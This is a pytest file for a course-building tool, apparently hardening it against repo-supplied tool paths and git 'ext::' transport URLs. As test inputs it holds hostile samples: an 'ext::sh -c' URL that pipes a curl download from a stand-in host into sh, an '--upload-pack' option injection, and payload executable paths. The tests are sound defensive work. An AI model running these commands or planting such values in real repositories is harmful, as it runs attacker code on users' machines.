"""A course repo may not choose which program CLM runs — finding S5.

`clm.toml` / `.clm/config.toml` are discovered by walking up from cwd, so they
are found *inside a cloned course repo*, and `external_tools.drawio_executable`
reached `subprocess` with no validation: clone, `clm build`, and a repo-supplied
binary runs on the first `.drawio` file — on the **host**, in every worker mode,
whether or not the build executes a single notebook.

The same shape via git: `<repository-base>` in the spec becomes a URL handed to
`git clone` / `git ls-remote`, and git's `ext::<command>` transport executes its
argument as a shell command (`protocol.ext.allow` defaults to `user`, i.e.
allowed for exactly this kind of direct invocation).

Pinned here:

* the two executable-path keys are dropped from the **project** tier, with a
  WARNING naming the file, and survive in the operator tiers (user config, env);
* `jupyter.kernel_python` is deliberately **not** filtered (documented,
  load-bearing, and it selects the interpreter for that same repo's notebook
  code, which a Direct-mode build executes on the host regardless);
* the remote-URL allowlist refuses `ext::` and friends, at the spec and at the
  transport.
"""

from __future__ import annotations

import logging
from pathlib import Path

import pytest

from clm.core.remote_url import RemoteUrlError, validate_remote_url
from clm.infrastructure.config import (
    ALLOW_PROJECT_TOOL_PATHS_ENV_VAR,
    ClmConfig,
    strip_project_forbidden_keys,
)

_HOSTILE_TOML = """
[logging]
log_level = "WARNING"

[external_tools]
drawio_executable = "./payload.exe"
plantuml_jar = "./payload.jar"
"""


def _clear_tool_env(monkeypatch: pytest.MonkeyPatch) -> None:
    for var in ("PLANTUML_JAR", "DRAWIO_EXECUTABLE", ALLOW_PROJECT_TOOL_PATHS_ENV_VAR):
        monkeypatch.delenv(var, raising=False)


class TestProjectConfigMayNotChooseExecutables:
    def test_repo_local_clm_toml_cannot_set_the_tool_paths(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, caplog
    ) -> None:
        _clear_tool_env(monkeypatch)
        (tmp_path / "clm.toml").write_text(_HOSTILE_TOML, encoding="utf-8")
        monkeypatch.chdir(tmp_path)

        with caplog.at_level(logging.WARNING, logger="clm.infrastructure.config"):
            config = ClmConfig()

        assert config.external_tools.drawio_executable == ""
        assert config.external_tools.plantuml_jar == ""
        # The rest of the file still applies — this is a key filter, not a
        # "reject the whole config" sledgehammer.
        assert config.logging.log_level == "WARNING"
        # Silence would turn "my tool path is ignored" into a mystery.
        warnings = [r.message for r in caplog.records if "may not choose" in r.message]
        assert len(warnings) == 2, caplog.text
        assert any("drawio_executable" in m and "clm.toml" in m for m in warnings)
        assert all(ALLOW_PROJECT_TOOL_PATHS_ENV_VAR in m for m in warnings)

    def test_dotclm_config_is_filtered_too(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Both project-tier filenames, not just the one the finding named."""
        _clear_tool_env(monkeypatch)
        clm_dir = tmp_path / ".clm"
        clm_dir.mkdir()
        (clm_dir / "config.toml").write_text(_HOSTILE_TOML, encoding="utf-8")
        monkeypatch.chdir(tmp_path)

        assert ClmConfig().external_tools.drawio_executable == ""

    def test_the_env_var_opt_in_restores_it(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The escape hatch is env-only — a channel the repo cannot write to."""
        _clear_tool_env(monkeypatch)
        (tmp_path / "clm.toml").write_text(_HOSTILE_TOML, encoding="utf-8")
        monkeypatch.chdir(tmp_path)
        monkeypatch.setenv(ALLOW_PROJECT_TOOL_PATHS_ENV_VAR, "1")

        assert ClmConfig().external_tools.drawio_executable == "./payload.exe"

    def test_the_user_tier_still_sets_the_tool_paths(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Only the repo-local tier is filtered — that is the whole distinction."""
        _clear_tool_env(monkeypatch)
        user_config = tmp_path / "user-config.toml"
        user_config.write_text(_HOSTILE_TOML, encoding="utf-8")
        monkeypatch.setattr(
            "clm.infrastructure.config.find_config_files",
            lambda: {"system": None, "user": user_config, "project": None},
        )

        config = ClmConfig()
        assert config.external_tools.drawio_executable == "./payload.exe"
        assert config.external_tools.plantuml_jar == "./payload.jar"

    def test_the_environment_still_sets_the_tool_paths(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        _clear_tool_env(monkeypatch)
        (tmp_path / "clm.toml").write_text(_HOSTILE_TOML, encoding="utf-8")
        monkeypatch.chdir(tmp_path)
        monkeypatch.setenv("DRAWIO_EXECUTABLE", "/opt/drawio")

        assert ClmConfig().external_tools.drawio_executable == "/opt/drawio"

    def test_kernel_python_is_deliberately_not_filtered(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """PythonCourses commits `kernel_python = ".venv"`; that must keep working.

        It selects the interpreter that hosts the notebook kernel for *that same
        repo's* notebook code, which a Direct-mode build executes on the host
        anyway — so filtering it would break a documented workflow to close
        nothing.
        """
        _clear_tool_env(monkeypatch)
        monkeypatch.delenv("CLM_NOTEBOOK_KERNEL_PYTHON", raising=False)
        (tmp_path / "clm.toml").write_text('[jupyter]\nkernel_python = ".venv"\n', encoding="utf-8")
        monkeypatch.chdir(tmp_path)

        assert ClmConfig().jupyter.kernel_python == ".venv"

    def test_stripping_does_not_mutate_the_callers_dict(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv(ALLOW_PROJECT_TOOL_PATHS_ENV_VAR, raising=False)
        data = {"external_tools": {"drawio_executable": "./x", "extra": "keep"}}
        stripped = strip_project_forbidden_keys(data, Path("clm.toml"))

        assert data["external_tools"]["drawio_executable"] == "./x"
        assert stripped["external_tools"] == {"extra": "keep"}

    def test_a_clean_config_is_passed_through_unchanged(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv(ALLOW_PROJECT_TOOL_PATHS_ENV_VAR, raising=False)
        data = {"logging": {"log_level": "INFO"}}
        assert strip_project_forbidden_keys(data, Path("clm.toml")) is data


class TestRemoteUrlAllowlist:
    @pytest.mark.parametrize(
        "url",
        [
            "https://github.com/Org/repo",
            "http://gitlab.internal/group/repo",
            "ssh://git@github.com/Org/repo.git",
            "git://example.com/repo.git",
            "file:///srv/git/repo.git",
            "git@github.com:Org/repo.git",  # scp-like, no scheme
            "/srv/git/repo.git",
            r"C:\repos\repo",  # a Windows drive letter is not a scheme
            "C:/repos/repo",
        ],
    )
    def test_accepts_the_forms_git_workflows_use(self, url: str) -> None:
        assert validate_remote_url(url) == url

    @pytest.mark.parametrize(
        "url",
        [
            "ext::sh -c 'curl http://evil/x | sh'",
            "ext::git-upload-pack /repo",
            "fd::7/repo",
            "transport::whatever",
        ],
    )
    def test_refuses_remote_helper_syntax(self, url: str) -> None:
        with pytest.raises(RemoteUrlError, match="remote-helper syntax"):
            validate_remote_url(url)

    @pytest.mark.parametrize("url", ["ftp://example.com/repo", "javascript:alert(1)"])
    def test_refuses_other_schemes(self, url: str) -> None:
        with pytest.raises(RemoteUrlError, match="not allowed"):
            validate_remote_url(url)

    def test_refuses_an_option_lookalike(self) -> None:
        with pytest.raises(RemoteUrlError, match="command-line option"):
            validate_remote_url("--upload-pack=touch /tmp/pwned")

    def test_refuses_empty(self) -> None:
        with pytest.raises(RemoteUrlError, match="empty"):
            validate_remote_url("   ")

    def test_the_message_names_the_source(self) -> None:
        with pytest.raises(RemoteUrlError, match="the release-channel template"):
            validate_remote_url("ext::sh -c x", source="the release-channel template")


class TestSpecDerivedUrlsAreValidated:
    def _spec(self, repository_base: str):
        from clm.core.course_spec import GitHubSpec

        return GitHubSpec(project_slug="course", repository_base=repository_base)

    def test_a_hostile_repository_base_refuses_at_derivation(self) -> None:
        with pytest.raises(RemoteUrlError, match="remote-helper syntax"):
            self._spec("ext::sh -c 'curl http://evil/x | sh'").derive_remote_url("public", "de")

    def test_a_hostile_repository_base_refuses_for_release_channels(self) -> None:
        with pytest.raises(RemoteUrlError, match="remote-helper syntax"):
            self._spec("ext::sh -c x").derive_channel_remote_url("cohort-jan")

    def test_a_normal_base_still_derives(self) -> None:
        spec = self._spec("https://github.com/Org")
        assert spec.derive_remote_url("public", "de") == "https://github.com/Org/course-de"


class TestGitTransportIsPinned:
    def test_every_invocation_disables_the_ext_transport(self) -> None:
        """Layer 2: covers URLs that never came from a spec (e.g. .git/config)."""
        from clm.cli.commands.git import _transport_safety_config_args

        assert _transport_safety_config_args() == ["-c", "protocol.ext.allow=never"]

    def test_the_runners_pass_it(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        import subprocess

        from clm.cli.commands import git as git_cmd

        seen: list[list[str]] = []

        def fake_run(cmd, **kwargs):
            seen.append(list(cmd))
            return subprocess.CompletedProcess(args=cmd, returncode=0, stdout="", stderr="")

        monkeypatch.setattr(subprocess, "run", fake_run)
        git_cmd.run_git(tmp_path, "status")
        git_cmd.run_git_global("ls-remote", "https://example.com/repo")

        assert len(seen) == 2
        for cmd in seen:
            assert cmd[0] == "git"
            assert "protocol.ext.allow=never" in cmd
            # Before the command itself, or git would read it as a subcommand arg.
            assert cmd.index("protocol.ext.allow=never") < cmd.index(cmd[-1])
